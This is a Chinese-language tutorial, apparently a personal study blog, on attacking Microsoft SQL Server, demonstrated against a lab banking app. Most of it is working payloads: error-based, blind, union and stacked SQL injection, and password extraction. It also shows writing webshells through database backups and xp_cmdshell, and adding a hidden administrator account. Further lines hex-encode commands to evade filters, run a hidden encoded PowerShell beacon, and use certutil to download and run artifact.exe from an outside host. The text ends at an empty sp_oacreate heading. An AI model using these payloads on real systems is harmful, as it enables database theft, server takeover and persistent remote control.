[从0开始学习Microsoft SQL Server数据库攻防](https://xz.aliyun.com/t/10955)

[MSSQL 注入攻击与防御](https://www.anquanke.com/post/id/86011)

# 介绍

- 默认库

`select name from master.dbo.sysdatabases;`

```
[
  {
    "name": "master"//储存了所有数据库名与存储过程,类似于information_schema
  },
  {
    "name": "tempdb"//为临时表和其他临时工作提供了一个存储区
  },
  {
    "name": "model"//为用户数据库提供的样板
  },
  {
    "name": "msdb"//记录任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息
  }
]
```

![](https://img.mi3aka.eu.org/2022/08/15423b3010e4eee917224480695ea74c.png)

- 查询字段

`select top 100 name,xtype from sysobjects;`

```
C = CHECK 约束
D = 默认值或 DEFAULT 约束
F = FOREIGN KEY 约束
L = 日志
FN = 标量函数
IF = 内嵌表函数
P = 存储过程
PK = PRIMARY KEY 约束（类型是 K）
RF = 复制筛选存储过程
S = 系统表
TF = 表函数
TR = 触发器
U = 用户表
UQ = UNIQUE 约束（类型是 K）
V = 视图
X = 扩展存储过程
```

![](https://img.mi3aka.eu.org/2022/08/fde6ade28892f543d78f486a707b1c71.png)

- 存储过程

存储过程是一组为了完成特定功能的SQL语句集合,经编译后存储在数据库中,用户通过指定存储过程的名称并给出参数来执行

常用的危险存储过程

```
xp_cmdshell
xp_dirtree
xp_enumgroups
xp_fixeddrives
xp_loginconfig
xp_enumerrorlogs
xp_getfiledetails
Sp_OACreate
Sp_OADestroy
Sp_OAGetErrorInfo
Sp_OAGetProperty
Sp_OAMethod
Sp_OASetProperty
Sp_OAStop
Xp_regaddmultistring
Xp_regdeletekey
Xp_regdeletevalue
Xp_regenumvalues
Xp_regread
Xp_regremovemultistring
Xp_regwrite
sp_makewebtask
```

# 符号

## 注释符号

1. `/*`

在IDE里面可以使用`select 1 union select 2/*';`,但是在实际注入中却不行,还是要用`/**/`

![](https://img.mi3aka.eu.org/2022/08/06fc8beb7b36e55026488a873365f737.png)

![](https://img.mi3aka.eu.org/2022/08/b1f389e792b15aced23b849d380b56a1.png)

2. `--`

这里与mysql不同,后面不用接空格

![](https://img.mi3aka.eu.org/2022/08/a37b3ec9cd68629abd88edb34a55e65f.png)


3. `;%00`

不少文章都说`;%00`可以作为空字节注释,但是我没复现出来...

![](https://img.mi3aka.eu.org/2022/08/5514bc5ab4b1cbe3c08715a70b34ef49.png)

## 空白符号

```
%00-%20
/*xxx*/
```

## 运算符

```
ALL 如果一组的比较都为true，则比较结果为true
AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false
ANY 如果一组的比较中任何一个为true，则结果为true
BETWEEN 如果操作数在某个范围之内，那么结果为true
EXISTS  如果子查询中包含了一些行，那么结果为true
IN  如果操作数等于表达式列表中的一个，那么结果为true
LIKE    如果操作数与某种模式相匹配，那么结果为true
NOT 对任何其他布尔运算符的结果值取反
OR  如果两个布尔表达式中的任何一个为true，那么结果为true
SOME    如果在一组比较中，有些比较为true，那么结果为true
```

## 语法定义符号

```
< > 尖括号，用于分隔字符串，字符串为语法元素的名称，SQL语言的非终结符。
::= 定义操作符。用在生成规则中，分隔规则定义的元素和规则定义。 被定义的元素位于操作符的左边，规则定义位于操作符的右边。
[ ] 方括号表示规则中的可选元素。方括号中的规则部分可以明确指定也可以省略。
{ } 花括号聚集规则中的元素。在花括号中的规则部分必须明确指定。
() 括号是分组运算符
```

# 常用注入方法

## 报错注入

1. 获取当前用户

`user_id=1 and user>1;`

![](https://img.mi3aka.eu.org/2022/08/05c778388b1a39d6d36dbfa66434aee4.png)

2. 查询数据库版本信息

`user_id=1 and (select @@version)>1;`

![](https://img.mi3aka.eu.org/2022/08/aaa4e33545240807bfa55b15efcbfd18.png)

3. 判断站库分离

`user_id=1 and (select host_name())>1;`

`user_id=1 and (select @@servername)>1;`

>不相同则说明站库分离

`user_id=1 and ((select host_name())=(select @@servername))`

4. 判断是否支持子查询

`user_id=1 and (select count(*) from sysobjects)>1`

5. 判断是否支持堆叠

`user_id=1;waitfor delay '0:0:5';--`

![](https://img.mi3aka.eu.org/2022/08/7c26e7ffe3f198e3f281fb256308ec89.png)

6. 判断权限

- 服务器

```
and 1=(select is_srvrolemember('sysadmin'))
and 1=(select is_srvrolemember('serveradmin'))
and 1=(select is_srvrolemember('setupadmin'))
and 1=(select is_srvrolemember('securityadmin'))
and 1=(select is_srvrolemember('diskadmin'))
and 1=(select is_srvrolemember('bulkadmin'))
```

![](https://img.mi3aka.eu.org/2022/08/d2c1ce7bf61f5b48750cf39bcf13fa89.jpg)

- 数据库

```
and 1=(select is_member('db_owner'))
and 1=(select is_member('db_securityadmin'))
and 1=(select is_member('db_accessadmin'))
and 1=(select is_member('db_backupoperator'))
and 1=(select is_member('db_ddladmin'))
and 1=(select is_member('db_datawriter'))
and 1=(select is_member('db_datareader'))
and 1=(select is_member('db_denydatawriter'))
and 1=(select is_member('db_denydatareader'))
```

![](https://img.mi3aka.eu.org/2022/08/f4a98578e0eaff0a5bed2bb399b22008.png)

7. 获取数据库名

`user_id=1 and (select db_name())>1;`

![](https://img.mi3aka.eu.org/2022/08/f6760fb5ee651314924ecfb50584e54e.png)

>利用dbid进行遍历,获取所有数据库名

`select top 1 name from master..sysdatabases where dbid=1`

![](https://img.mi3aka.eu.org/2022/08/e68ee7bc827ff2595e0250870dc861b2.png)

![](https://img.mi3aka.eu.org/2022/08/96a22f71fe1e8eb660f0a496f581e07a.png)

`select name from master..sysdatabases for xml path`

![](https://img.mi3aka.eu.org/2022/08/69efb33a302f8e699309731c413dd161.png)

但要注意,报错回显的长度是存在限制的,长度过长会提示将截断字符串或二进制数据

`user_id=1 and (select name from master..sysdatabases where dbid < 2 for xml path)=1;`

`user_id=1 and (select name from master..sysdatabases where dbid < 5 and dbid > 2 for xml path)=1;`

8. 获取表名

`user_id=1 and (select top 1 name from sysobjects where xtype='u')=1;`

![](https://img.mi3aka.eu.org/2022/08/adc632ed8ad9807211e7c84b20b1252f.png)

>利用ORDER BY获取所有表名(版本>=2012)

[https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2012/ms188385(v=sql.110)?redirectedfrom=MSDN](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2012/ms188385(v=sql.110)?redirectedfrom=MSDN)

```
use FoundStone_Bank;
select name from sysobjects where xtype='u';
select name from sysobjects where xtype='u' order by 1 offset 0 rows FETCH NEXT 5 ROWS ONLY;
select name from sysobjects where xtype='u' order by 1 offset 5 rows FETCH NEXT 5 ROWS ONLY;
```

![](https://img.mi3aka.eu.org/2022/08/043795995d83e4a2b24895c38cfc78fc.png)

`user_id=1 and (select name from sysobjects where xtype='u' order by 1 offset 0 rows FETCH NEXT 5 ROWS ONLY for xml path)=1;`

![](https://img.mi3aka.eu.org/2022/08/e231c83ef2b4bc34b8a765f3f835fbf8.png)

9. 获取列名

>在查询表名时除了name列外还有一个id列,用于进行列名的查询

```
use FoundStone_Bank;
select id,name from sysobjects where xtype='u';
select top 1 name from syscolumns where id=565577053;
```

![](https://img.mi3aka.eu.org/2022/08/785c4547bb19804e81d9c9a449d2bc8a.png)

```
use FoundStone_Bank;
select name from syscolumns where id=(select id from sysobjects where xtype='u' and name='fsb_accounts');
```

![](https://img.mi3aka.eu.org/2022/08/91c1830482e34dc69eb698b79dfa7700.png)

```
user_id=1 and (select name from syscolumns where id=(select id from sysobjects where xtype='u' and name='fsb_accounts') order by 1 offset 0 rows FETCH NEXT 5 ROWS ONLY for xml path)=1;
```

![](https://img.mi3aka.eu.org/2022/08/2c2b85b9d91adead1bde6e64eea4d286.png)

10. 获取数据

`user_id=1 and (select top 1 password from fsb_users)=2;`

![](https://img.mi3aka.eu.org/2022/08/680b40f517692aa842a0817ad9e6854f.png)

>批量查询,利用派生表保证从order by后的顺序仍然一致

```
use FoundStone_Bank;
select * from fsb_users;
select b from (select 1 as a,user_name as b from fsb_users order by 1 offset 0 rows FETCH NEXT 5 ROWS ONLY) as c;
select b from (select 1 as a,password as b from fsb_users order by 1 offset 0 rows FETCH NEXT 5 ROWS ONLY) as c;
```

![](https://img.mi3aka.eu.org/2022/08/6390b62addda2b25c87eb8f0088ec36d.png)

`user_id=1 and (select b from (select 1 as a,user_name as b from fsb_users order by 1 offset 0 rows FETCH NEXT 5 ROWS ONLY) as c for xml path)=2;`

![](https://img.mi3aka.eu.org/2022/08/a48bf87bb978a71ba0c841f07792e1a6.png)

## 布尔盲注

```
user_id=1 and len((select @@version))>10
user_id=1 and len((select @@version))<10
user_id=1 and ascii(substring((select @@version),1,1))>100
user_id=1 and ascii(substring((select @@version),1,1))<100

user_id=1 and (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN 1 ELSE 0 END)=1
```

## 时间盲注

```
user_id=1 if(1=1) waitfor delay '0:0:5'
if()中的内容与布尔盲注基本一致
还有一个参数叫waitfor time,MSDN上的解释时waitfor time用于定时执行任务
```

![](https://img.mi3aka.eu.org/2022/08/db6510fe2cd372c3286c17baf42ad900.png)

![](https://img.mi3aka.eu.org/2022/08/d554c23e9dd5f97eaca05e31f295b0ae.png)

## 联合注入

>mssql联合注入一般不使用数字占位,而是null,因为使用数字占位可能会发生隐式转换

基本思路与mysql一致

1. orderby判断列数

![](https://img.mi3aka.eu.org/2022/08/25d1f49d78e82a60c4ec284026c8e716.png)

2. 回显列判断

![](https://img.mi3aka.eu.org/2022/08/aab12904eeb93bd48bcc7146ef15b0d1.png)

3. 获取数据

![](https://img.mi3aka.eu.org/2022/08/78755696d0089b503e930cb4d9dbc0c4.png)

![](https://img.mi3aka.eu.org/2022/08/8c0f0a28d45d0fc3ce484606086330bc.png)

## 堆叠注入

1. `user_id=0;waitfor delay '0:0:5'`

![](https://img.mi3aka.eu.org/2022/08/ce111f2a79e462c79130fa32543be9f5.png)

2. `user_id=1;declare @a varchar(2000) set @a=cast(0x77616974666f722064656c61792027303a303a3527 as varchar(2000));exec(@a) --`

![](https://img.mi3aka.eu.org/2022/08/7009a5f980e2e4c3fdc52973f6e82165.png)

```python
payload="asdf"

print("0x",end="")
for ch in payload:
    print(str(hex(ord(ch)))[2:].zfill(2),end="")
```

## 常用函数/绕过技巧

```
CAST(expression AS data_type)
CONVERT(data_type[(length)], expression [, style])

select cast(@@version as int);
select convert(int,@@version);
```

![](https://img.mi3aka.eu.org/2022/08/68bc9cec97b4521088687c2012f2f126.png)

![](https://img.mi3aka.eu.org/2022/08/e7034b8787b893d004a1963d7de0f5a5.png)

```
len() //mssql没有length函数,只有len
for xml path('')//可以去除<row>标签,增加回显的数据量
```

# getshell与提权

## SA权限

### 备份getshell

查找网站根目录

```
execute master..xp_dirtree 'c:'
execute master..xp_dirtree 'c:\inetpub\wwwroot'
列出c盘的所有文件,c:\inetpub\wwwroot下的所有文件

execute master..xp_dirtree 'c:',1
execute master..xp_dirtree 'c:\inetpub\wwwroot',1
列出c盘的根目录下的文件夹,c:\inetpub\wwwroot下的文件夹
execute master..xp_dirtree 'c:',1,1
execute master..xp_dirtree 'c:\inetpub\wwwroot',1,1
列出c盘的根目录下的文件夹和文件,c:\inetpub\wwwroot下的文件夹和文件
```

![](https://img.mi3aka.eu.org/2022/09/122c6bde763f2f2c4a2cf13980eecbe4.png)

>将结果保存到数据库的一个临时表中

```
DROP TABLE tmp;CREATE TABLE tmp (sub varchar(8000),depth int,is_file int);insert into tmp(sub,depth,is_file) execute master..xp_dirtree 'c:\inetpub\wwwroot',1,1;

select * from tmp;
```

![](https://img.mi3aka.eu.org/2022/09/daa0bf838c1976b0a45e81c55897b5bc.png)

1. 差异备份

```
drop table tmp;
backup database FoundStone_Bank to disk = 'c:\Users\Default\AppData\Local\Temp\sql.bak';
注意判断该目录是否有权限写入
create table tmp (shell image);
insert into tmp(shell) values(0x61736466717765726173646671657772617364666177756a7168666b6a7361666b6c61736a666c6b61736a666c6b616a73666c6b3b61736a666c6b61736a6664);


backup database FoundStone_Bank to disk = 'c:\inetpub\wwwroot\shell.asp' with differential,format;
backup database FoundStone_Bank to disk = 'c:\Windows\Temp\shell.asp' with differential,format;
注意判断该目录是否有权限写入
```

![](https://img.mi3aka.eu.org/2022/09/baa8aa8afd3c0510050862c682ccc6e5.png)

![](https://img.mi3aka.eu.org/2022/09/66d67cf903e4b0fe0506e689457d5b86.png)

2. log备份

>log备份需要先把指定的数据库激活为还原模式

```
drop table tmp;
alter database FoundStone_Bank set recovery full;
create table tmp (shell image);
backup log FoundStone_Bank to disk = 'c:\Users\Default\AppData\Local\Temp\sql.bak' with init ;
注意判断该目录是否有权限写入
insert into tmp(shell) values(0x61736466717765726173646671657772617364666177756a7168666b6a7361666b6c61736a666c6b61736a666c6b616a73666c6b3b61736a666c6b61736a6664);
backup log FoundStone_Bank to disk = 'c:\Windows\Temp\shell.asp'
注意判断该目录是否有权限写入
```

![](https://img.mi3aka.eu.org/2022/09/7918f005553f480ab0c5d467b398dc84.png)

>相较于差异备份,log备份要小很多

### xp_cmdshell

```
exec master..xp_cmdshell 'whoami';
```

![](https://img.mi3aka.eu.org/2022/09/087b9255199ae7860fb5e481d272c52d.png)

通过xp_cmdshell进行命令执行从而写入webshell/添加用户/上线cs

>写入webshell

```
exec master..xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%@Impor...ls(this);%^> > c:\\inetpub\\wwwroot\\shell.aspx'
这里同样需要注意是否具有写入权限,同时要注意<符号要使用^进行转义
exec master..xp_cmdshell 'echo ^<%@ Page Language="C#" %^>^<%@Impor...ls(this);%^> > c:\\Windows\\Temp\\shell.aspx'
```

![](https://img.mi3aka.eu.org/2022/09/108fa24036ab9e12ea76ebbf624bc843.png)

![](https://img.mi3aka.eu.org/2022/09/a8780b9931405ac1a182b616fed11e6c.png)

假设不知道当前网站的绝对路径，可以通过枚举的方式得到当前路径

```python
#原始命令如下
#通过 if not '%j'=='xxx' 去剔除路径
cmd /c "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (echo %k > %k\asdfqwer.txt))))"

#注意转义
payload="cmd /c \"for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (echo %k > %k\\asdfqwer.txt))))\""

print("0x",end="")
for ch in payload:
    print(str(hex(ord(ch)))[2:].zfill(2),end="")

declare @a varchar(2000) set @a=cast(0x636d64202f632022666f7220256920696e20284120422043204420452046204720482049204a204b204c204d204e204f2050205120522053205420552056205720582059205a2920646f2028666f72202f6620256a20696e2028276469722025693a5c2a202f4144202f42202f4f4e272920646f20286966206e6f742027256a273d3d2757696e646f777327206966206e6f742027256a273d3d2750726f6772616d27206966206e6f742027256a273d3d2753797374656d27206966206e6f742027256a273d3d275265636f7665727927206966206e6f742027256a273d3d27557365727327206966206e6f742027256a273d3d2750726f6772616d4461746127206966206e6f742027256a273d3d27506572664c6f6773272028666f72202f6620256b20696e2028276469722025693a5c256a5c2a202f4144202f42202f4f4e202f53272920646f20286563686f20256b203e20256b5c61736466717765722e7478742929292922 as varchar(2000));exec master..xp_cmdshell @a
```

![](https://img.mi3aka.eu.org/2022/09/6a8767f82be3795daffa1c1f777b5b66.png)

![](https://img.mi3aka.eu.org/2022/09/2351c4760d70856b3e933efc8c1d55cb.png)

```python
#痕迹清除
cmd /c "for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (del %k\asdfqwer.txt))))"

#注意转义
payload="cmd /c \"for %i in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (for /f %j in ('dir %i:\* /AD /B /ON') do (if not '%j'=='Windows' if not '%j'=='Program' if not '%j'=='System' if not '%j'=='Recovery' if not '%j'=='Users' if not '%j'=='ProgramData' if not '%j'=='PerfLogs' (for /f %k in ('dir %i:\%j\* /AD /B /ON /S') do (del %k\\asdfqwer.txt))))\""

print("0x",end="")
for ch in payload:
    print(str(hex(ord(ch)))[2:].zfill(2),end="")

declare @a varchar(2000) set @a=cast(0x636d64202f632022666f7220256920696e20284120422043204420452046204720482049204a204b204c204d204e204f2050205120522053205420552056205720582059205a2920646f2028666f72202f6620256a20696e2028276469722025693a5c2a202f4144202f42202f4f4e272920646f20286966206e6f742027256a273d3d2757696e646f777327206966206e6f742027256a273d3d2750726f6772616d27206966206e6f742027256a273d3d2753797374656d27206966206e6f742027256a273d3d275265636f7665727927206966206e6f742027256a273d3d27557365727327206966206e6f742027256a273d3d2750726f6772616d4461746127206966206e6f742027256a273d3d27506572664c6f6773272028666f72202f6620256b20696e2028276469722025693a5c256a5c2a202f4144202f42202f4f4e202f53272920646f202864656c20256b5c61736466717765722e7478742929292922 as varchar(2000));exec master..xp_cmdshell @a
```

>添加用户

```
exec master..xp_cmdshell 'net user test$ test123456TEST!!! /add /Y'
exec master..xp_cmdshell 'net localgroup administrators test$ /add'
要求较高的权限,这里直接用powershell演示
```

![](https://img.mi3aka.eu.org/2022/09/9a452691849471676702483db39957f5.png)

![](https://img.mi3aka.eu.org/2022/09/e93f28f5e71eb9425e588c85e92bfc86.png)

>上线cs

1. powershell直接上线

```
exec master..xp_cmdshell 'powershell -nop -w hidden -encodedcommand JABzAD0A...sA'
```

![](https://img.mi3aka.eu.org/2022/09/8b5d067e4fcf1f09aae154327e772945.png)

2. certutil

```
cmd /c "cd c:\Windows\Temp\ & certutil -urlcache -split -f http://192.168.89.129:8000/artifact.exe & .\artifact.exe"

declare @a varchar(2000) set @a=cast(0x636d64202f632022636420633a5c57696e646f77735c54656d705c202620636572747574696c202d75726c6361636865202d73706c6974202d6620687474703a2f2f3139322e3136382e38392e3132393a383030302f61727469666163742e6578652026202e5c61727469666163742e65786522 as varchar(2000));exec master..xp_cmdshell @a
```

![](https://img.mi3aka.eu.org/2022/09/bd7e59cf3e940ba53fe978aef53007ad.png)

[极限环境Certutil加Powershell配合Burp快速落地文件](https://y4er.com/posts/certutil-powershell-write-file/)

利用base64对恶意文件进行编码,落地后再通过`certutil.exe -decode .\raw.txt a.exe`恢复成exe文件





### sp_oacreate

